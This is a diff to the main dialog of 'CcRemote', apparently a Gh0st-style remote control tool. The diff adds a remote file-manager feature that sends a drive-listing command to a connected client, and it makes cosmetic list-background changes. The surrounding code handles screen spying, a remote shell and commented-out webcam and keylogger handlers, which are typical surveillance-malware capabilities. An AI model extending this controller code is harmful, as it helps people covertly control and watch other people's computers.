@@ -84,8 +84,8 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
 	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
+	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
 	
-
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
 	ON_WM_PAINT()
@@ -294,6 +294,8 @@ void CCcRemoteDlg::OnSize(UINT nType, int cx, int cy)
 	if (SIZE_MINIMIZED == nType)//当窗口最小化避免大小为0造成崩溃直接返回
 		return;
 
+	
+
 	if (m_CList_Online.m_hWnd != NULL)
 	{
 		CRect rc;
@@ -310,6 +312,12 @@ void CCcRemoteDlg::OnSize(UINT nType, int cx, int cy)
 			int lenth = dd;                                 //转换为int 类型
 			m_CList_Online.SetColumnWidth(i, (lenth));      //设置当前的宽度
 		}
+		//TCHAR szBuffer[_MAX_PATH];
+		//VERIFY(::GetModuleFileName(AfxGetInstanceHandle(), szBuffer, _MAX_PATH));
+		//CString sPath = (CString)szBuffer;	sPath = sPath.Left(sPath.ReverseFind('\\') + 1);	
+		CString sPath = "F:\\myapp\\CcRemote\\CcRemote\\CcRemote\\res\\background_list_online.bmp";
+		m_CList_Online.SetBkImage(sPath.GetBuffer(sPath.GetLength()), TRUE);   // 定义：CListCtrl m_controllist1;	
+		sPath.ReleaseBuffer();
 	}
 	if (m_CList_Message.m_hWnd != NULL)
 	{
@@ -327,6 +335,9 @@ void CCcRemoteDlg::OnSize(UINT nType, int cx, int cy)
 			int lenth = dd;                                   //转换为int 类型
 			m_CList_Message.SetColumnWidth(i, (lenth));        //设置当前的宽度
 		}
+		CString sPath = "F:\\myapp\\CcRemote\\CcRemote\\CcRemote\\res\\background_list_online.bmp";
+		m_CList_Message.SetBkImage(sPath.GetBuffer(sPath.GetLength()), TRUE);   // 定义：CListCtrl m_controllist1;	
+		sPath.ReleaseBuffer();
 	}
 
 	if (m_wndStatusBar.m_hWnd != NULL) {    //当对话框大小改变时 状态条大小也随之改变
@@ -375,15 +386,15 @@ int CCcRemoteDlg::InitMyMenu()
 
 int CCcRemoteDlg::InitList()
 {
-	//m_CList_Online.SetTextBkColor(CLR_NONE);
-	//m_CList_Online.SetBkColor(CLR_NONE);
-	//m_CList_Online.SetTextColor(RGB(255, 0, 0));
-	//TCHAR szBuffer[_MAX_PATH];	
-	//VERIFY(::GetModuleFileName(AfxGetInstanceHandle(), szBuffer, _MAX_PATH));	
-	////CString sPath = (CString)szBuffer;	sPath = sPath.Left(sPath.ReverseFind('\\') + 1);	
-	//CString sPath = "F:\myapp\\CcRemote\\CcRemote\\CcRemote\\background_picture.bmp";
-	//m_CList_Online.SetBkImage(sPath.GetBuffer(sPath.GetLength()), TRUE);   // 定义：CListCtrl m_controllist1;	
-	//sPath.ReleaseBuffer();
+	
+	// CLR_NONE没有背景色。图像是透明的。
+	m_CList_Online.SetTextBkColor(CLR_NONE);
+	m_CList_Online.SetBkColor(CLR_NONE);
+	m_CList_Online.SetTextColor(RGB(255, 0, 0));
+
+	m_CList_Message.SetTextBkColor(CLR_NONE);
+	m_CList_Message.SetBkColor(CLR_NONE);
+	//m_CList_Message.SetTextColor(RGB(255, 0, 0));
 
 	//设置list可选中
 	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
@@ -451,12 +462,13 @@ void CCcRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
 	m_OnlineCount = (m_OnlineCount <= 0 ? 0 : m_OnlineCount);         //防止iCount 有-1的情况
 	strStatusMsg.Format("已连接: %d", m_OnlineCount);
 	m_wndStatusBar.SetPaneText(0, strStatusMsg);   //在状态条上显示文字
-
+	
 }
 
 
 void CCcRemoteDlg::Test()
 {
+	
 	ShowMessage(true, "软件初始化成功...");
 	//AddList("192.168.0.1", "本机局域网", "CHANG", "Windows7", "2.2GHZ", "有", "123232");
 	//AddList("192.168.10.1", "本机局域网", "WANG", "Windows10", "2.2GHZ", "无", "111111");
@@ -520,6 +532,8 @@ void CCcRemoteDlg::OnOnlineDesktop()
 void CCcRemoteDlg::OnOnlineFile()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_LIST_DRIVE;            //在服务端中搜索COMMAND_LIST_DRIVE
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -709,6 +723,8 @@ void CCcRemoteDlg::OnClose()
 {
 	// TODO: 在此添加消息处理程序代码和/或调用默认值
 	Shell_NotifyIcon(NIM_DELETE, &nid); //销毁图标
+	m_CList_Message.SetBkImage("relese", TRUE);
+	m_CList_Online.SetBkImage("relese", TRUE);
 	CDialogEx::OnClose();
 }
 
@@ -766,9 +782,9 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	{
 		switch (pContext->m_Dialog[0])
 		{
-		//case FILEMANAGER_DLG:
-		//	((CFileManagerDlg *)dlg)->OnReceiveComplete();
-		//	break;
+		case FILEMANAGER_DLG:
+			((CFileManagerDlg *)dlg)->OnReceiveComplete();
+			break;
 		case SCREENSPY_DLG:
 			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -824,11 +840,7 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	}
 
 	break;
-	/*case TOKEN_DRIVE_LIST: // 驱动器列表
-		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
-		g_pCcRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
-		break;
-	
+	/*
 	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
 		g_pCcRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 		break;
@@ -838,6 +850,10 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	case TOKEN_KEYBOARD_START:
 		g_pCcRemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;*/
+	case TOKEN_DRIVE_LIST: // 驱动器列表
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+		g_pCcRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		break;
 	case TOKEN_BITMAPINFO: //
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
 		g_pCcRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
@@ -1029,23 +1045,41 @@ LRESULT CCcRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+//打开文件管理窗口
+LRESULT CCcRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
+{
+
+	ClientContext *pContext = (ClientContext *)lParam;
+
+	//转到CFileManagerDlg  构造函数
+	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为桌面
+	dlg->Create(IDD_FILE, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = FILEMANAGER_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return 0;
+}
 
 //绘制背景图片
 BOOL CCcRemoteDlg::OnEraseBkgnd(CDC* pDC)
 {
 	// TODO: 在此添加消息处理程序代码和/或调用默认值
-	CDC MemDC;	MemDC.CreateCompatibleDC(pDC); 
-	CBitmap Cbp;	
-	Cbp.LoadBitmap(IDB_BACKGROUND_CCREMOTE);
-	MemDC.SelectObject(&Cbp); 	
-	BITMAP Bp;	
-	Cbp.GetBitmap(&Bp); 	
-	CRect rect;	
-	GetClientRect(&rect);	
-	pDC->StretchBlt(0, 0, rect.Width(), rect.Height(), &MemDC, 0, 0, Bp.bmWidth, Bp.bmHeight, SRCCOPY); 	
-	MemDC.DeleteDC();	
+	//CDC MemDC;	MemDC.CreateCompatibleDC(pDC); 
+	//CBitmap Cbp;	
+	//Cbp.LoadBitmap(IDB_BACKGROUND_CCREMOTE);
+	//MemDC.SelectObject(&Cbp); 	
+	//BITMAP Bp;	
+	//Cbp.GetBitmap(&Bp); 	
+	//CRect rect;	
+	//GetClientRect(&rect);	
+	//pDC->StretchBlt(0, 0, rect.Width(), rect.Height(), &MemDC, 0, 0, Bp.bmWidth, Bp.bmHeight, SRCCOPY); 	
+	//MemDC.DeleteDC();	
+	
 	return TRUE;
-	//return CDialogEx::OnEraseBkgnd(pDC);
+	return CDialogEx::OnEraseBkgnd(pDC);
 }
 
 
